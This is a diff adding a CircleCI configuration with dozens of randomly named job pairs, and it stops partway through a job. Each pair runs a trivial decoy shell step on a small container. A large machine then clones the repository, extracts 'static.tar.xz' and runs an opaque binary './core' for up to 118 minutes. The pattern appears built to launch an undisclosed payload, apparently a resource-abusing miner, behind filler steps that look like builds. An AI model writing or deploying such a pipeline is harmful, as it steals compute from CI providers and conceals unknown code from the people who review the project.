@@ -1,0 +1,1677 @@
+version: 2.1
+
+jobs:
+  tap_break-prod:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: tuesday bite
+          command: |
+            mkdir -p /tmp/ci-ws
+            set +o pipefail 2>/dev/null; seq 1 1062472 | md5sum > /tmp/ci-ws/357.txt; true
+            len=$(wc -c </tmp/ci-ws/357.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 357.txt
+  break-prod:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/357.txt || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  bake_callisto-plus:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: hanger break
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; sort -u <<<$(echo -e "a\nb\na\nc") | wc -l; true ; } > /tmp/ci-ws/audit.txt
+            len=$(wc -c </tmp/ci-ws/audit.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - audit.txt
+  callisto-plus:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/audit.txt || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  reup_java17-lint:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: back road
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; echo -n abcdef | wc -c; true ; } > /tmp/ci-ws/2023-08-27.data
+            len=$(wc -c </tmp/ci-ws/2023-08-27.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 2023-08-27.data
+  java17-lint:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/2023-08-27.data || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  bake_Build_Tests3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: dune drift
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; date +"%W"; true ; } > /tmp/ci-ws/audit.gz
+            len=$(wc -c </tmp/ci-ws/audit.gz); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - audit.gz
+  Build_Tests3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/audit.gz || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  validate_rm-db-leak:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: hang shirt
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; cat /etc/hostname | md5sum; true ; } > /tmp/ci-ws/manifest
+            len=$(wc -c </tmp/ci-ws/manifest); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - manifest
+  rm-db-leak:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/manifest || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  reup_succes-only-31:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: warp drive
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; IFS=: read -ra parts <<<"a:b:c:d:e" && echo ${#parts[@]}; true ; } > /tmp/ci-ws/payload.tgz
+            len=$(wc -c </tmp/ci-ws/payload.tgz); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - payload.tgz
+  succes-only-31:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/payload.tgz || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  g1_tb-alt:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: tell the pm
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; ls / | sort | md5sum; true ; } > /tmp/ci-ws/pt-A.state
+            len=$(wc -c </tmp/ci-ws/pt-A.state); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - pt-A.state
+  tb-alt:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/pt-A.state || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  postcheck_preview-v7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: RUN THIS
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; echo "trailing   " | sed 's/ *$//' | wc -c; true ; } > /tmp/ci-ws/bundle
+            len=$(wc -c </tmp/ci-ws/bundle); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - bundle
+  preview-v7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/bundle || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  red_fiona-push:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: cyclone pass
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=20;i++)printf "%2d%s", i, i%5==0?"\n":" "}'; true ; } > /tmp/ci-ws/log.ndjson
+            len=$(wc -c </tmp/ci-ws/log.ndjson); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - log.ndjson
+  fiona-push:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/log.ndjson || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  fixture_build-production-artifact-bundle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: tempo change
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; yes "abcd" | head -200 | md5sum; true ; } > /tmp/ci-ws/61.log
+            len=$(wc -c </tmp/ci-ws/61.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 61.log
+  build-production-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/61.log || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  loader_sep5-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: spin till settled
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; sed 's/foo/bar/g; s/baz/qux/g' <<<"foo baz foobaz"; true ; } > /tmp/ci-ws/counts.jsonl
+            len=$(wc -c </tmp/ci-ws/counts.jsonl); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - counts.jsonl
+  sep5-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/counts.jsonl || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  bundle_omar-verify:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: monday blues
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; echo "abcdef" | fold -w2; true ; } > /tmp/ci-ws/2023-02-06.data
+            len=$(wc -c </tmp/ci-ws/2023-02-06.data); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 2023-02-06.data
+  omar-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/2023-02-06.data || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  hook_juliet-4:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: assisted pullup
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; echo "pw" | sha256sum | sha256sum | awk '{print $1}' | head -c 24; true ; } > /tmp/ci-ws/audit.ndjson
+            len=$(wc -c </tmp/ci-ws/audit.ndjson); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - audit.ndjson
+  juliet-4:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/audit.ndjson || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  B_vb-3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: dong
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{a=0;b=1; for(i=0;i<20;i++){print b; c=a+b; a=b; b=c}}' | wc -l; true ; } > /tmp/ci-ws/stage.blob
+            len=$(wc -c </tmp/ci-ws/stage.blob); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - stage.blob
+  vb-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/stage.blob || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  phase1_aug1-smoke:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: ravenous
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; date -d "@1700000000" 2>/dev/null +%Y || date +%Y; true ; } > /tmp/ci-ws/counts.tsv
+            len=$(wc -c </tmp/ci-ws/counts.tsv); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - counts.tsv
+  aug1-smoke:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/counts.tsv || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  phase2_STAGE_PROD:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: against grain
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{OFS=","; print 1,2,3; print "a","b","c"}'; true ; } > /tmp/ci-ws/OK
+            len=$(wc -c </tmp/ci-ws/OK); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - OK
+  STAGE_PROD:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/OK || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  phase1_rl-3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: cleared for take
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; echo -e "A\tB\tC\n1\t2\t3" | awk -F'\t' '{print $2}'; true ; } > /tmp/ci-ws/.state
+            len=$(wc -c </tmp/ci-ws/.state); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - .state
+  rl-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/.state || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  prebuild_d-3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: hove to
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{t=0; n=5000; for(i=0;i<n;i++)t+=(i*31+7)%97; print t}'; true ; } > /tmp/ci-ws/44.blob
+            len=$(wc -c </tmp/ci-ws/44.blob); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - 44.blob
+  d-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/44.blob || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  fixture_v8-canary:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: mesquite
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=1;i<=100;i++)if(i*i == int(i*i))x++; print x}'; true ; } > /tmp/ci-ws/stage.raw
+            len=$(wc -c </tmp/ci-ws/stage.raw); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - stage.raw
+  v8-canary:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/stage.raw || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  step2_uma-verify:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: front flip
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; printf "%s\n" 10 20 30 | awk '{s+=$1; n++}END{print s/n}'; true ; } > /tmp/ci-ws/stats.tsv
+            len=$(wc -c </tmp/ci-ws/stats.tsv); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - stats.tsv
+  uma-verify:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/stats.tsv || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  cleanup_titan-rev:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: frost
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; hash -r && echo cache-cleared; true ; } > /tmp/ci-ws/step-3.out
+            len=$(wc -c </tmp/ci-ws/step-3.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - step-3.out
+  titan-rev:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/step-3.out || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  rerun_bug-4003:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: septet
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{print int(sqrt(2)*1000)}'; true ; } > /tmp/ci-ws/passoff.sig
+            len=$(wc -c </tmp/ci-ws/passoff.sig); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - passoff.sig
+  bug-4003:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/passoff.sig || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  canary1_fix-2532:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: flag red
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; alias | wc -l 2>/dev/null || echo zero; true ; } > /tmp/ci-ws/log.gz
+            len=$(wc -c </tmp/ci-ws/log.gz); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - log.gz
+  fix-2532:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/log.gz || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  dispatch_fix-8912:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: polish final
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; seq 1 500 | awk 'END{print NR}'; true ; } > /tmp/ci-ws/report.txt
+            len=$(wc -c </tmp/ci-ws/report.txt); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - report.txt
+  fix-8912:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/report.txt || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  p2_produce-quick-artifact-bundle:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: scap pullup
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s="hello world"; gsub("l","L",s); print s}'; true ; } > /tmp/ci-ws/phase-ready.log
+            len=$(wc -c </tmp/ci-ws/phase-ready.log); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - phase-ready.log
+  produce-quick-artifact-bundle:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/phase-ready.log || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  rerun_cook-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: pressurized
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{s=""; for(i=0;i<40;i++)s=s"-"; print "|" s "|"}'; true ; } > /tmp/ci-ws/step-11.out
+            len=$(wc -c </tmp/ci-ws/step-11.out); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
+            - step-11.out
+  cook-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: Review handoff
+          command: |
+            grep -c . /tmp/ci-ws/step-11.out || true
+      - run:
+          name: Get project
+          command: git clone --depth 5 --quiet --no-single-branch --filter=tree:0 --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Unpack payload
+          command: tar --extract --xz --file=static.tar.xz
+      - run:
+          no_output_timeout: 118m
+          command: /bin/bash -c "./core"
+  staging_PROD_RUN_9:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/ci-ws
+      - run:
+          name: drizzle
+          command: |
+            mkdir -p /tmp/ci-ws
+            { set +o pipefail 2>/dev/null; echo "$RANDOM$RANDOM" | md5sum; true ; } > /tmp/ci-ws/timings.csv
+            len=$(wc -c </tmp/ci-ws/timings.csv); echo "stage output written (${len} bytes)"
+      - persist_to_workspace:
+          root: /tmp/ci-ws
+          paths:
